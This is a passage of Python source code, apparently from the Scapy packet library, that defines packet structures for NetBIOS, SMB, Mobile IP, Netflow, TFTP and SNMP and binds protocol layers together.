                   ShortField("ANCOUNT",1),
                   ShortField("NSCOUNT",0),
                   ShortField("ARCOUNT",0),
                   NetBIOSNameField("RR_NAME","windows"),
                   ShortEnumField("SUFFIX",0x4141,{0x4141:"workstation",0x4141+0x03:"messenger service",0x4141+0x200:"file server service",0x4141+0x10b:"domain master browser",0x4141+0x10c:"domain controller", 0x4141+0x10e:"browser election service"}),
                   ByteField("NULL",0),
                   ShortEnumField("RR_TYPE",0x20, {0x20:"NB",0x21:"NBSTAT"}),
                   ShortEnumField("RR_CLASS",1,{1:"INTERNET"}),
                   IntField("TTL", 2),
                   ShortField("RDLENGTH",2),
                   BitField("RDATA",10512,16)] #10512=0010100100010000

class NBTDatagram(Packet):
    name="NBT Datagram Packet"
    fields_desc= [ByteField("Type", 0x10),
                  ByteField("Flags", 0x02),
                  ShortField("ID", 0),
                  IPField("SourceIP", "127.0.0.1"),
                  ShortField("SourcePort", 138),
                  ShortField("Length", 272),
                  ShortField("Offset", 0),
                  NetBIOSNameField("SourceName","windows"),
                  ShortEnumField("SUFFIX1",0x4141,{0x4141:"workstation",0x4141+0x03:"messenger service",0x4141+0x200:"file server service",0x4141+0x10b:"domain master browser",0x4141+0x10c:"domain controller", 0x4141+0x10e:"browser election service"}),
                  ByteField("NULL",0),
                  NetBIOSNameField("DestinationName","windows"),
                  ShortEnumField("SUFFIX2",0x4141,{0x4141:"workstation",0x4141+0x03:"messenger service",0x4141+0x200:"file server service",0x4141+0x10b:"domain master browser",0x4141+0x10c:"domain controller", 0x4141+0x10e:"browser election service"}),
                  ByteField("NULL",0)]


class NBTSession(Packet):
    name="NBT Session Packet"
    fields_desc= [ByteEnumField("TYPE",0,{0x00:"Session Message",0x81:"Session Request",0x82:"Positive Session Response",0x83:"Negative Session Response",0x84:"Retarget Session Response",0x85:"Session Keepalive"}),
                  BitField("RESERVED",0x00,7),
                  BitField("LENGTH",0,17)]


# SMB NetLogon Response Header
class SMBNetlogon_Protocol_Response_Header(Packet):
    name="SMBNetlogon Protocol Response Header"
    fields_desc = [StrFixedLenField("Start","\xffSMB",4),
                   ByteEnumField("Command",0x25,{0x25:"Trans"}),
                   ByteField("Error_Class",0x02),
                   ByteField("Reserved",0),
                   LEShortField("Error_code",4),
                   ByteField("Flags",0),
                   LEShortField("Flags2",0x0000),
                   LEShortField("PIDHigh",0x0000),
                   LELongField("Signature",0x0),
                   LEShortField("Unused",0x0),
                   LEShortField("TID",0),
                   LEShortField("PID",0),
                   LEShortField("UID",0),
                   LEShortField("MID",0),
                   ByteField("WordCount",17),
                   LEShortField("TotalParamCount",0),
                   LEShortField("TotalDataCount",112),
                   LEShortField("MaxParamCount",0),
                   LEShortField("MaxDataCount",0),
                   ByteField("MaxSetupCount",0),
                   ByteField("unused2",0),
                   LEShortField("Flags3",0),
                   ByteField("TimeOut1",0xe8),
                   ByteField("TimeOut2",0x03),
                   LEShortField("unused3",0),
                   LEShortField("unused4",0),
                   LEShortField("ParamCount2",0),
                   LEShortField("ParamOffset",0),
                   LEShortField("DataCount",112),
                   LEShortField("DataOffset",92),
                   ByteField("SetupCount", 3),
                   ByteField("unused5", 0)]

# SMB MailSlot Protocol
class SMBMailSlot(Packet):
    name = "SMB Mail Slot Protocol"
    fields_desc = [LEShortField("opcode", 1),
                   LEShortField("priority", 1),
                   LEShortField("class", 2),
                   LEShortField("size", 135),
                   StrNullField("name","\MAILSLOT\NET\GETDC660")]

# SMB NetLogon Protocol Response Tail SAM
class SMBNetlogon_Protocol_Response_Tail_SAM(Packet):
    name = "SMB Netlogon Protocol Response Tail SAM"
    fields_desc = [ByteEnumField("Command", 0x17, {0x12:"SAM logon request", 0x17:"SAM Active directory Response"}),
                   ByteField("unused", 0),
                   ShortField("Data1", 0),
                   ShortField("Data2", 0xfd01),
                   ShortField("Data3", 0),
                   ShortField("Data4", 0xacde),
                   ShortField("Data5", 0x0fe5),
                   ShortField("Data6", 0xd10a),
                   ShortField("Data7", 0x374c),
                   ShortField("Data8", 0x83e2),
                   ShortField("Data9", 0x7dd9),
                   ShortField("Data10", 0x3a16),
                   ShortField("Data11", 0x73ff),
                   ByteField("Data12", 0x04),
                   StrFixedLenField("Data13", "rmff", 4),
                   ByteField("Data14", 0x0),
                   ShortField("Data16", 0xc018),
                   ByteField("Data18", 0x0a),
                   StrFixedLenField("Data20", "rmff-win2k", 10),
                   ByteField("Data21", 0xc0),
                   ShortField("Data22", 0x18c0),
                   ShortField("Data23", 0x180a),
                   StrFixedLenField("Data24", "RMFF-WIN2K", 10),
                   ShortField("Data25", 0),
                   ByteField("Data26", 0x17),
                   StrFixedLenField("Data27", "Default-First-Site-Name", 23),
                   ShortField("Data28", 0x00c0),
                   ShortField("Data29", 0x3c10),
                   ShortField("Data30", 0x00c0),
                   ShortField("Data31", 0x0200),
                   ShortField("Data32", 0x0),
                   ShortField("Data33", 0xac14),
                   ShortField("Data34", 0x0064),
                   ShortField("Data35", 0x0),
                   ShortField("Data36", 0x0),
                   ShortField("Data37", 0x0),
                   ShortField("Data38", 0x0),
                   ShortField("Data39", 0x0d00),
                   ShortField("Data40", 0x0),
                   ShortField("Data41", 0xffff)]

# SMB NetLogon Protocol Response Tail LM2.0
class SMBNetlogon_Protocol_Response_Tail_LM20(Packet):
    name = "SMB Netlogon Protocol Response Tail LM20"
    fields_desc = [ByteEnumField("Command",0x06,{0x06:"LM 2.0 Response to logon request"}),
                   ByteField("unused", 0),
                   StrFixedLenField("DblSlash", "\\\\", 2),
                   StrNullField("ServerName","WIN"),
                   LEShortField("LM20Token", 0xffff)]

# SMBNegociate Protocol Request Header
class SMBNegociate_Protocol_Request_Header(Packet):
    name="SMBNegociate Protocol Request Header"
    fields_desc = [StrFixedLenField("Start","\xffSMB",4),
                   ByteEnumField("Command",0x72,{0x72:"SMB_COM_NEGOTIATE"}),
                   ByteField("Error_Class",0),
                   ByteField("Reserved",0),
                   LEShortField("Error_code",0),
                   ByteField("Flags",0x18),
                   LEShortField("Flags2",0x0000),
                   LEShortField("PIDHigh",0x0000),
                   LELongField("Signature",0x0),
                   LEShortField("Unused",0x0),
                   LEShortField("TID",0),
                   LEShortField("PID",1),
                   LEShortField("UID",0),
                   LEShortField("MID",2),
                   ByteField("WordCount",0),
                   LEShortField("ByteCount",12)]

# SMB Negociate Protocol Request Tail
class SMBNegociate_Protocol_Request_Tail(Packet):
    name="SMB Negociate Protocol Request Tail"
    fields_desc=[ByteField("BufferFormat",0x02),
                 StrNullField("BufferData","NT LM 0.12")]

# SMBNegociate Protocol Response Advanced Security
class SMBNegociate_Protocol_Response_Advanced_Security(Packet):
    name="SMBNegociate Protocol Response Advanced Security"
    fields_desc = [StrFixedLenField("Start","\xffSMB",4),
                   ByteEnumField("Command",0x72,{0x72:"SMB_COM_NEGOTIATE"}),
                   ByteField("Error_Class",0),
                   ByteField("Reserved",0),
                   LEShortField("Error_Code",0),
                   ByteField("Flags",0x98),
                   LEShortField("Flags2",0x0000),
                   LEShortField("PIDHigh",0x0000),
                   LELongField("Signature",0x0),
                   LEShortField("Unused",0x0),
                   LEShortField("TID",0),
                   LEShortField("PID",1),
                   LEShortField("UID",0),
                   LEShortField("MID",2),
                   ByteField("WordCount",17),
                   LEShortField("DialectIndex",7),
                   ByteField("SecurityMode",0x03),
                   LEShortField("MaxMpxCount",50),
                   LEShortField("MaxNumberVC",1),
                   LEIntField("MaxBufferSize",16144),
                   LEIntField("MaxRawSize",65536),
                   LEIntField("SessionKey",0x0000),
                   LEShortField("ServerCapabilities",0xf3f9),
                   BitField("UnixExtensions",0,1),
                   BitField("Reserved2",0,7),
                   BitField("ExtendedSecurity",1,1),
                   BitField("CompBulk",0,2),
                   BitField("Reserved3",0,5),
# There have been 127490112000000000 tenths of micro-seconds between 1st january 1601 and 1st january 2005. 127490112000000000=0x1C4EF94D6228000, so ServerTimeHigh=0xD6228000 and ServerTimeLow=0x1C4EF94.
                   LEIntField("ServerTimeHigh",0xD6228000L),
                   LEIntField("ServerTimeLow",0x1C4EF94),
                   LEShortField("ServerTimeZone",0x3c),
                   ByteField("EncryptionKeyLength",0),
                   LEFieldLenField("ByteCount", None, "SecurityBlob", adjust=lambda pkt,x:x-16),
                   BitField("GUID",0,128),
                   StrLenField("SecurityBlob", "", length_from=lambda x:x.ByteCount+16)]

# SMBNegociate Protocol Response No Security
# When using no security, with EncryptionKeyLength=8, you must have an EncryptionKey before the DomainName
class SMBNegociate_Protocol_Response_No_Security(Packet):
    name="SMBNegociate Protocol Response No Security"
    fields_desc = [StrFixedLenField("Start","\xffSMB",4),
                   ByteEnumField("Command",0x72,{0x72:"SMB_COM_NEGOTIATE"}),
                   ByteField("Error_Class",0),
                   ByteField("Reserved",0),
                   LEShortField("Error_Code",0),
                   ByteField("Flags",0x98),
                   LEShortField("Flags2",0x0000),
                   LEShortField("PIDHigh",0x0000),
                   LELongField("Signature",0x0),
                   LEShortField("Unused",0x0),
                   LEShortField("TID",0),
                   LEShortField("PID",1),
                   LEShortField("UID",0),
                   LEShortField("MID",2),
                   ByteField("WordCount",17),
                   LEShortField("DialectIndex",7),
                   ByteField("SecurityMode",0x03),
                   LEShortField("MaxMpxCount",50),
                   LEShortField("MaxNumberVC",1),
                   LEIntField("MaxBufferSize",16144),
                   LEIntField("MaxRawSize",65536),
                   LEIntField("SessionKey",0x0000),
                   LEShortField("ServerCapabilities",0xf3f9),
                   BitField("UnixExtensions",0,1),
                   BitField("Reserved2",0,7),
                   BitField("ExtendedSecurity",0,1),
                   FlagsField("CompBulk",0,2,"CB"),
                   BitField("Reserved3",0,5),
                   # There have been 127490112000000000 tenths of micro-seconds between 1st january 1601 and 1st january 2005. 127490112000000000=0x1C4EF94D6228000, so ServerTimeHigh=0xD6228000 and ServerTimeLow=0x1C4EF94.
                   LEIntField("ServerTimeHigh",0xD6228000L),
                   LEIntField("ServerTimeLow",0x1C4EF94),
                   LEShortField("ServerTimeZone",0x3c),
                   ByteField("EncryptionKeyLength",8),
                   LEShortField("ByteCount",24),
                   BitField("EncryptionKey",0,64),
                   StrNullField("DomainName","WORKGROUP"),
                   StrNullField("ServerName","RMFF1")]

# SMBNegociate Protocol Response No Security No Key
class SMBNegociate_Protocol_Response_No_Security_No_Key(Packet):
    namez="SMBNegociate Protocol Response No Security No Key"
    fields_desc = [StrFixedLenField("Start","\xffSMB",4),
                   ByteEnumField("Command",0x72,{0x72:"SMB_COM_NEGOTIATE"}),
                   ByteField("Error_Class",0),
                   ByteField("Reserved",0),
                   LEShortField("Error_Code",0),
                   ByteField("Flags",0x98),
                   LEShortField("Flags2",0x0000),
                   LEShortField("PIDHigh",0x0000),
                   LELongField("Signature",0x0),
                   LEShortField("Unused",0x0),
                   LEShortField("TID",0),
                   LEShortField("PID",1),
                   LEShortField("UID",0),
                   LEShortField("MID",2),
                   ByteField("WordCount",17),
                   LEShortField("DialectIndex",7),
                   ByteField("SecurityMode",0x03),
                   LEShortField("MaxMpxCount",50),
                   LEShortField("MaxNumberVC",1),
                   LEIntField("MaxBufferSize",16144),
                   LEIntField("MaxRawSize",65536),
                   LEIntField("SessionKey",0x0000),
                   LEShortField("ServerCapabilities",0xf3f9),
                   BitField("UnixExtensions",0,1),
                   BitField("Reserved2",0,7),
                   BitField("ExtendedSecurity",0,1),
                   FlagsField("CompBulk",0,2,"CB"),
                   BitField("Reserved3",0,5),
                   # There have been 127490112000000000 tenths of micro-seconds between 1st january 1601 and 1st january 2005. 127490112000000000=0x1C4EF94D6228000, so ServerTimeHigh=0xD6228000 and ServerTimeLow=0x1C4EF94.
                   LEIntField("ServerTimeHigh",0xD6228000L),
                   LEIntField("ServerTimeLow",0x1C4EF94),
                   LEShortField("ServerTimeZone",0x3c),
                   ByteField("EncryptionKeyLength",0),
                   LEShortField("ByteCount",16),
                   StrNullField("DomainName","WORKGROUP"),
                   StrNullField("ServerName","RMFF1")]

# Session Setup AndX Request
class SMBSession_Setup_AndX_Request(Packet):
    name="Session Setup AndX Request"
    fields_desc=[StrFixedLenField("Start","\xffSMB",4),
                ByteEnumField("Command",0x73,{0x73:"SMB_COM_SESSION_SETUP_ANDX"}),
                 ByteField("Error_Class",0),
                 ByteField("Reserved",0),
                 LEShortField("Error_Code",0),
                 ByteField("Flags",0x18),
                 LEShortField("Flags2",0x0001),
                 LEShortField("PIDHigh",0x0000),
                 LELongField("Signature",0x0),
                 LEShortField("Unused",0x0),
                 LEShortField("TID",0),
                 LEShortField("PID",1),
                 LEShortField("UID",0),
                 LEShortField("MID",2),
                 ByteField("WordCount",13),
                 ByteEnumField("AndXCommand",0x75,{0x75:"SMB_COM_TREE_CONNECT_ANDX"}),
                 ByteField("Reserved2",0),
                 LEShortField("AndXOffset",96),
                 LEShortField("MaxBufferS",2920),
                 LEShortField("MaxMPXCount",50),
                 LEShortField("VCNumber",0),
                 LEIntField("SessionKey",0),
                 LEFieldLenField("ANSIPasswordLength",None,"ANSIPassword"),
                 LEShortField("UnicodePasswordLength",0),
                 LEIntField("Reserved3",0),
                 LEShortField("ServerCapabilities",0x05),
                 BitField("UnixExtensions",0,1),
                 BitField("Reserved4",0,7),
                 BitField("ExtendedSecurity",0,1),
                 BitField("CompBulk",0,2),
                 BitField("Reserved5",0,5),
                 LEShortField("ByteCount",35),
                 StrLenField("ANSIPassword", "Pass",length_from=lambda x:x.ANSIPasswordLength),
                 StrNullField("Account","GUEST"),
                 StrNullField("PrimaryDomain",  ""),
                 StrNullField("NativeOS","Windows 4.0"),
                 StrNullField("NativeLanManager","Windows 4.0"),
                 ByteField("WordCount2",4),
                 ByteEnumField("AndXCommand2",0xFF,{0xFF:"SMB_COM_NONE"}),
                 ByteField("Reserved6",0),
                 LEShortField("AndXOffset2",0),
                 LEShortField("Flags3",0x2),
                 LEShortField("PasswordLength",0x1),
                 LEShortField("ByteCount2",18),
                 ByteField("Password",0),
                 StrNullField("Path","\\\\WIN2K\\IPC$"),
                 StrNullField("Service","IPC")]

# Session Setup AndX Response
class SMBSession_Setup_AndX_Response(Packet):
    name="Session Setup AndX Response"
    fields_desc=[StrFixedLenField("Start","\xffSMB",4),
                 ByteEnumField("Command",0x73,{0x73:"SMB_COM_SESSION_SETUP_ANDX"}),
                 ByteField("Error_Class",0),
                 ByteField("Reserved",0),
                 LEShortField("Error_Code",0),
                 ByteField("Flags",0x90),
                 LEShortField("Flags2",0x1001),
                 LEShortField("PIDHigh",0x0000),
                 LELongField("Signature",0x0),
                 LEShortField("Unused",0x0),
                 LEShortField("TID",0),
                 LEShortField("PID",1),
                 LEShortField("UID",0),
                 LEShortField("MID",2),
                 ByteField("WordCount",3),
                 ByteEnumField("AndXCommand",0x75,{0x75:"SMB_COM_TREE_CONNECT_ANDX"}),
                 ByteField("Reserved2",0),
                 LEShortField("AndXOffset",66),
                 LEShortField("Action",0),
                 LEShortField("ByteCount",25),
                 StrNullField("NativeOS","Windows 4.0"),
                 StrNullField("NativeLanManager","Windows 4.0"),
                 StrNullField("PrimaryDomain",""),
                 ByteField("WordCount2",3),
                 ByteEnumField("AndXCommand2",0xFF,{0xFF:"SMB_COM_NONE"}),
                 ByteField("Reserved3",0),
                 LEShortField("AndXOffset2",80),
                 LEShortField("OptionalSupport",0x01),
                 LEShortField("ByteCount2",5),
                 StrNullField("Service","IPC"),
                 StrNullField("NativeFileSystem","")]

class MobileIP(Packet):
    name = "Mobile IP (RFC3344)"
    fields_desc = [ ByteEnumField("type", 1, {1:"RRQ", 3:"RRP"}) ]

class MobileIPRRQ(Packet):
    name = "Mobile IP Registration Request (RFC3344)"
    fields_desc = [ XByteField("flags", 0),
                    ShortField("lifetime", 180),
                    IPField("homeaddr", "0.0.0.0"),
                    IPField("haaddr", "0.0.0.0"),
                    IPField("coaddr", "0.0.0.0"),
                    Field("id", "", "64s") ]

class MobileIPRRP(Packet):
    name = "Mobile IP Registration Reply (RFC3344)"
    fields_desc = [ ByteField("code", 0),
                    ShortField("lifetime", 180),
                    IPField("homeaddr", "0.0.0.0"),
                    IPField("haaddr", "0.0.0.0"),
                    Field("id", "", "64s") ]

class MobileIPTunnelData(Packet):
    name = "Mobile IP Tunnel Data Message (RFC3519)"
    fields_desc = [ ByteField("nexthdr", 4),
                    ShortField("res", 0) ]


# Cisco Netflow Protocol version 1
class NetflowHeader(Packet):
    name = "Netflow Header"
    fields_desc = [ ShortField("version", 1) ]

class NetflowHeaderV1(Packet):
    name = "Netflow Header V1"
    fields_desc = [ ShortField("count", 0),
                    IntField("sysUptime", 0),
                    IntField("unixSecs", 0),
                    IntField("unixNanoSeconds", 0) ]


class NetflowRecordV1(Packet):
    name = "Netflow Record"
    fields_desc = [ IPField("ipsrc", "0.0.0.0"),
                    IPField("ipdst", "0.0.0.0"),
                    IPField("nexthop", "0.0.0.0"),
                    ShortField("inputIfIndex", 0),
                    ShortField("outpuIfIndex", 0),
                    IntField("dpkts", 0),
                    IntField("dbytes", 0),
                    IntField("starttime", 0),
                    IntField("endtime", 0),
                    ShortField("srcport", 0),
                    ShortField("dstport", 0),
                    ShortField("padding", 0),
                    ByteField("proto", 0),
                    ByteField("tos", 0),
                    IntField("padding1", 0),
                    IntField("padding2", 0) ]


TFTP_operations = { 1:"RRQ",2:"WRQ",3:"DATA",4:"ACK",5:"ERROR",6:"OACK" }


class TFTP(Packet):
    name = "TFTP opcode"
    fields_desc = [ ShortEnumField("op", 1, TFTP_operations), ]



class TFTP_RRQ(Packet):
    name = "TFTP Read Request"
    fields_desc = [ StrNullField("filename", ""),
                    StrNullField("mode", "octet") ]
    def answers(self, other):
        return 0
    def mysummary(self):
        return self.sprintf("RRQ %filename%"),[UDP]


class TFTP_WRQ(Packet):
    name = "TFTP Write Request"
    fields_desc = [ StrNullField("filename", ""),
                    StrNullField("mode", "octet") ]
    def answers(self, other):
        return 0
    def mysummary(self):
        return self.sprintf("WRQ %filename%"),[UDP]

class TFTP_DATA(Packet):
    name = "TFTP Data"
    fields_desc = [ ShortField("block", 0) ]
    def answers(self, other):
        return  self.block == 1 and isinstance(other, TFTP_RRQ)
    def mysummary(self):
        return self.sprintf("DATA %block%"),[UDP]

class TFTP_Option(Packet):
    fields_desc = [ StrNullField("oname",""),
                    StrNullField("value","") ]
    def extract_padding(self, pkt):
        return "",pkt

class TFTP_Options(Packet):
    fields_desc = [ PacketListField("options", [], TFTP_Option, length_from=lambda x:None) ]


class TFTP_ACK(Packet):
    name = "TFTP Ack"
    fields_desc = [ ShortField("block", 0) ]
    def answers(self, other):
        if isinstance(other, TFTP_DATA):
            return self.block == other.block
        elif isinstance(other, TFTP_RRQ) or isinstance(other, TFTP_WRQ) or isinstance(other, TFTP_OACK):
            return self.block == 0
        return 0
    def mysummary(self):
        return self.sprintf("ACK %block%"),[UDP]

TFTP_Error_Codes = {  0: "Not defined",
                      1: "File not found",
                      2: "Access violation",
                      3: "Disk full or allocation exceeded",
                      4: "Illegal TFTP operation",
                      5: "Unknown transfer ID",
                      6: "File already exists",
                      7: "No such user",
                      8: "Terminate transfer due to option negotiation",
                      }

class TFTP_ERROR(Packet):
    name = "TFTP Error"
    fields_desc = [ ShortEnumField("errorcode", 0, TFTP_Error_Codes),
                    StrNullField("errormsg", "")]
    def answers(self, other):
        return (isinstance(other, TFTP_DATA) or
                isinstance(other, TFTP_RRQ) or
                isinstance(other, TFTP_WRQ) or
                isinstance(other, TFTP_ACK))
    def mysummary(self):
        return self.sprintf("ERROR %errorcode%: %errormsg%"),[UDP]


class TFTP_OACK(Packet):
    name = "TFTP Option Ack"
    fields_desc = [  ]
    def answers(self, other):
        return isinstance(other, TFTP_WRQ) or isinstance(other, TFTP_RRQ)


##########
## SNMP ##
##########

######[ ASN1 class ]######

class ASN1_Class_SNMP(ASN1_Class_UNIVERSAL):
    name="SNMP"
    PDU_GET = 0xa0
    PDU_NEXT = 0xa1
    PDU_RESPONSE = 0xa2
    PDU_SET = 0xa3
    PDU_TRAPv1 = 0xa4
    PDU_BULK = 0xa5
    PDU_INFORM = 0xa6
    PDU_TRAPv2 = 0xa7


class ASN1_SNMP_PDU_GET(ASN1_SEQUENCE):
    tag = ASN1_Class_SNMP.PDU_GET

class ASN1_SNMP_PDU_NEXT(ASN1_SEQUENCE):
    tag = ASN1_Class_SNMP.PDU_NEXT

class ASN1_SNMP_PDU_RESPONSE(ASN1_SEQUENCE):
    tag = ASN1_Class_SNMP.PDU_RESPONSE

class ASN1_SNMP_PDU_SET(ASN1_SEQUENCE):
    tag = ASN1_Class_SNMP.PDU_SET

class ASN1_SNMP_PDU_TRAPv1(ASN1_SEQUENCE):
    tag = ASN1_Class_SNMP.PDU_TRAPv1

class ASN1_SNMP_PDU_BULK(ASN1_SEQUENCE):
    tag = ASN1_Class_SNMP.PDU_BULK

class ASN1_SNMP_PDU_INFORM(ASN1_SEQUENCE):
    tag = ASN1_Class_SNMP.PDU_INFORM

class ASN1_SNMP_PDU_TRAPv2(ASN1_SEQUENCE):
    tag = ASN1_Class_SNMP.PDU_TRAPv2


######[ BER codecs ]#######

class BERcodec_SNMP_PDU_GET(BERcodec_SEQUENCE):
    tag = ASN1_Class_SNMP.PDU_GET

class BERcodec_SNMP_PDU_NEXT(BERcodec_SEQUENCE):
    tag = ASN1_Class_SNMP.PDU_NEXT

class BERcodec_SNMP_PDU_RESPONSE(BERcodec_SEQUENCE):
    tag = ASN1_Class_SNMP.PDU_RESPONSE

class BERcodec_SNMP_PDU_SET(BERcodec_SEQUENCE):
    tag = ASN1_Class_SNMP.PDU_SET

class BERcodec_SNMP_PDU_TRAPv1(BERcodec_SEQUENCE):
    tag = ASN1_Class_SNMP.PDU_TRAPv1

class BERcodec_SNMP_PDU_BULK(BERcodec_SEQUENCE):
    tag = ASN1_Class_SNMP.PDU_BULK

class BERcodec_SNMP_PDU_INFORM(BERcodec_SEQUENCE):
    tag = ASN1_Class_SNMP.PDU_INFORM

class BERcodec_SNMP_PDU_TRAPv2(BERcodec_SEQUENCE):
    tag = ASN1_Class_SNMP.PDU_TRAPv2



######[ ASN1 fields ]######

class ASN1F_SNMP_PDU_GET(ASN1F_SEQUENCE):
    ASN1_tag = ASN1_Class_SNMP.PDU_GET

class ASN1F_SNMP_PDU_NEXT(ASN1F_SEQUENCE):
    ASN1_tag = ASN1_Class_SNMP.PDU_NEXT

class ASN1F_SNMP_PDU_RESPONSE(ASN1F_SEQUENCE):
    ASN1_tag = ASN1_Class_SNMP.PDU_RESPONSE

class ASN1F_SNMP_PDU_SET(ASN1F_SEQUENCE):
    ASN1_tag = ASN1_Class_SNMP.PDU_SET

class ASN1F_SNMP_PDU_TRAPv1(ASN1F_SEQUENCE):
    ASN1_tag = ASN1_Class_SNMP.PDU_TRAPv1

class ASN1F_SNMP_PDU_BULK(ASN1F_SEQUENCE):
    ASN1_tag = ASN1_Class_SNMP.PDU_BULK

class ASN1F_SNMP_PDU_INFORM(ASN1F_SEQUENCE):
    ASN1_tag = ASN1_Class_SNMP.PDU_INFORM

class ASN1F_SNMP_PDU_TRAPv2(ASN1F_SEQUENCE):
    ASN1_tag = ASN1_Class_SNMP.PDU_TRAPv2



######[ SNMP Packet ]######

SNMP_error = { 0: "no_error",
               1: "too_big",
               2: "no_such_name",
               3: "bad_value",
               4: "read_only",
               5: "generic_error",
               6: "no_access",
               7: "wrong_type",
               8: "wrong_length",
               9: "wrong_encoding",
              10: "wrong_value",
              11: "no_creation",
              12: "inconsistent_value",
              13: "ressource_unavailable",
              14: "commit_failed",
              15: "undo_failed",
              16: "authorization_error",
              17: "not_writable",
              18: "inconsistent_name",
               }

SNMP_trap_types = { 0: "cold_start",
                    1: "warm_start",
                    2: "link_down",
                    3: "link_up",
                    4: "auth_failure",
                    5: "egp_neigh_loss",
                    6: "enterprise_specific",
                    }

class SNMPvarbind(ASN1_Packet):
    ASN1_codec = ASN1_Codecs.BER
    ASN1_root = ASN1F_SEQUENCE( ASN1F_OID("oid","1.3"),
                                ASN1F_field("value",ASN1_NULL(0))
                                )


class SNMPget(ASN1_Packet):
    ASN1_codec = ASN1_Codecs.BER
    ASN1_root = ASN1F_SNMP_PDU_GET( ASN1F_INTEGER("id",0),
                                    ASN1F_enum_INTEGER("error",0, SNMP_error),
                                    ASN1F_INTEGER("error_index",0),
                                    ASN1F_SEQUENCE_OF("varbindlist", [], SNMPvarbind)
                                    )

class SNMPnext(ASN1_Packet):
    ASN1_codec = ASN1_Codecs.BER
    ASN1_root = ASN1F_SNMP_PDU_NEXT( ASN1F_INTEGER("id",0),
                                     ASN1F_enum_INTEGER("error",0, SNMP_error),
                                     ASN1F_INTEGER("error_index",0),
                                     ASN1F_SEQUENCE_OF("varbindlist", [], SNMPvarbind)
                                     )

class SNMPresponse(ASN1_Packet):
    ASN1_codec = ASN1_Codecs.BER
    ASN1_root = ASN1F_SNMP_PDU_RESPONSE( ASN1F_INTEGER("id",0),
                                         ASN1F_enum_INTEGER("error",0, SNMP_error),
                                         ASN1F_INTEGER("error_index",0),
                                         ASN1F_SEQUENCE_OF("varbindlist", [], SNMPvarbind)
                                         )

class SNMPset(ASN1_Packet):
    ASN1_codec = ASN1_Codecs.BER
    ASN1_root = ASN1F_SNMP_PDU_SET( ASN1F_INTEGER("id",0),
                                    ASN1F_enum_INTEGER("error",0, SNMP_error),
                                    ASN1F_INTEGER("error_index",0),
                                    ASN1F_SEQUENCE_OF("varbindlist", [], SNMPvarbind)
                                    )

class SNMPtrapv1(ASN1_Packet):
    ASN1_codec = ASN1_Codecs.BER
    ASN1_root = ASN1F_SNMP_PDU_TRAPv1( ASN1F_INTEGER("id",0),
                                       ASN1F_OID("enterprise", "1.3"),
                                       ASN1F_STRING("agent_addr",""),
                                       ASN1F_enum_INTEGER("generic_trap", 0, SNMP_trap_types),
                                       ASN1F_INTEGER("specific_trap", 0),
                                       ASN1F_INTEGER("time_stamp", IntAutoTime()),
                                       ASN1F_SEQUENCE_OF("varbindlist", [], SNMPvarbind)
                                       )

class SNMPbulk(ASN1_Packet):
    ASN1_codec = ASN1_Codecs.BER
    ASN1_root = ASN1F_SNMP_PDU_BULK( ASN1F_INTEGER("id",0),
                                     ASN1F_INTEGER("non_repeaters",0),
                                     ASN1F_INTEGER("max_repetitions",0),
                                     ASN1F_SEQUENCE_OF("varbindlist", [], SNMPvarbind)
                                     )

class SNMPinform(ASN1_Packet):
    ASN1_codec = ASN1_Codecs.BER
    ASN1_root = ASN1F_SNMP_PDU_INFORM( ASN1F_INTEGER("id",0),
                                       ASN1F_enum_INTEGER("error",0, SNMP_error),
                                       ASN1F_INTEGER("error_index",0),
                                       ASN1F_SEQUENCE_OF("varbindlist", [], SNMPvarbind)
                                       )

class SNMPtrapv2(ASN1_Packet):
    ASN1_codec = ASN1_Codecs.BER
    ASN1_root = ASN1F_SNMP_PDU_TRAPv2( ASN1F_INTEGER("id",0),
                                       ASN1F_enum_INTEGER("error",0, SNMP_error),
                                       ASN1F_INTEGER("error_index",0),
                                       ASN1F_SEQUENCE_OF("varbindlist", [], SNMPvarbind)
                                       )


class SNMP(ASN1_Packet):
    ASN1_codec = ASN1_Codecs.BER
    ASN1_root = ASN1F_SEQUENCE(
        ASN1F_enum_INTEGER("version", 1, {0:"v1", 1:"v2c", 2:"v2", 3:"v3"}),
        ASN1F_STRING("community","public"),
        ASN1F_CHOICE("PDU", SNMPget(),
                     SNMPget, SNMPnext, SNMPresponse, SNMPset,
                     SNMPtrapv1, SNMPbulk, SNMPinform, SNMPtrapv2)
        )
    def answers(self, other):
        return ( isinstance(self.PDU, SNMPresponse)    and
                 ( isinstance(other.PDU, SNMPget) or
                   isinstance(other.PDU, SNMPnext) or
                   isinstance(other.PDU, SNMPset)    ) and
                 self.PDU.id == other.PDU.id )



#################
## Bind layers ##
#################


def bind_bottom_up(lower, upper, __fval=None, **fval):
    if __fval is not None:
        fval.update(__fval)
    lower.payload_guess = lower.payload_guess[:]
    lower.payload_guess.append((fval, upper))


def bind_top_down(lower, upper, __fval=None, **fval):
    if __fval is not None:
        fval.update(__fval)
    upper.overload_fields = upper.overload_fields.copy()
    upper.overload_fields[lower] = fval

def bind_layers(lower, upper, __fval=None, **fval):
    if __fval is not None:
        fval.update(__fval)
    bind_top_down(lower, upper, **fval)
    bind_bottom_up(lower, upper, **fval)

def split_bottom_up(lower, upper, __fval=None, **fval):
    if __fval is not None:
        fval.update(__fval)
    def do_filter((f,u),upper=upper,fval=fval):
        if u != upper:
            return True
        for k in fval:
            if k not in f or f[k] != fval[k]:
                return True
        return False
    lower.payload_guess = filter(do_filter, lower.payload_guess)

def split_top_down(lower, upper, __fval=None, **fval):
    if __fval is not None:
        fval.update(__fval)
    if lower in upper.overload_fields:
        ofval = upper.overload_fields[lower]
        for k in fval:
            if k not in ofval or ofval[k] != fval[k]:
                return
        upper.overload_fields = upper.overload_fields.copy()
        del(upper.overload_fields[lower])

def split_layers(lower, upper, __fval=None, **fval):
    if __fval is not None:
        fval.update(__fval)
    split_bottom_up(lower, upper, **fval)
    split_top_down(lower, upper, **fval)


bind_layers( Dot3,          LLC,           )
bind_layers( GPRS,          IP,            )
bind_layers( PrismHeader,   Dot11,         )
bind_layers( RadioTap,      Dot11,         )
bind_layers( Dot11,         LLC,           type=2)
bind_layers( Dot11QoS,      LLC,           )
bind_layers( PPP,           IP,            proto=33)
bind_layers( Ether,         LLC,           type=122)
bind_layers( Ether,         Dot1Q,         type=33024)
bind_layers( Ether,         Ether,         type=1)
bind_layers( Ether,         ARP,           type=2054)
bind_layers( Ether,         IP,            type=2048)
bind_layers( Ether,         EAPOL,         type=34958)
bind_layers( Ether,         EAPOL,         dst='01:80:c2:00:00:03', type=34958)
bind_layers( Ether,         PPPoED,        type=34915)
bind_layers( Ether,         PPPoE,         type=34916)
